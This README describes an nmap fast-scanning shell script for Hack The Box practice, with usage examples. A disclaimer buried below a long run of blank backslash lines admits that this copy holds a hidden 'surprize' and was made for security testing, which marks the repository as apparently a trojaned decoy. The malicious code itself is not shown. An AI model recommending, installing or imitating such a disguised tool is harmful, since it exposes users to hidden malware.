# fast_nmap_scanner2.0
just another fast nmap scanner
Script for fast port-service scanning. Might be helpful in solving machines in HTB platform. The core was copied from "xakep"-journal. It operates in two stages. The first one performs a normal quick scan, the second one performs a more thorough scan using the available scripts (option -A). Final version contains flags --ping, --list and --cve

Usage:

    Basic usage (fast_scan):

./nmap-fast-scan.sh example.com

    Usage with pingability check (just adds -Pn to nmap if host is unreachable):

./nmap-fast-scan.sh --ping example.com

    Usage with CVE check:

./nmap-fast-scan.sh --cve example.com

    Usage with list of hosts:

./nmap-fast-scan.sh --list hosts.txt

    Basic fast scan of several hosts without list:

./nmap-fast-scan.sh 192.168.1.1 192.168.1.2 192.168.1.3

Every scans saves in /tmp/nmap_scans/ with unique name.

Requirements:

    uuidgen
    nmap

\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
\
p.s. !danger! this is version with surprize inside, repo made for security testing
dont download, dont launch. Original version: https://github.com/4oXyZ1D/nmap-fast-scanner
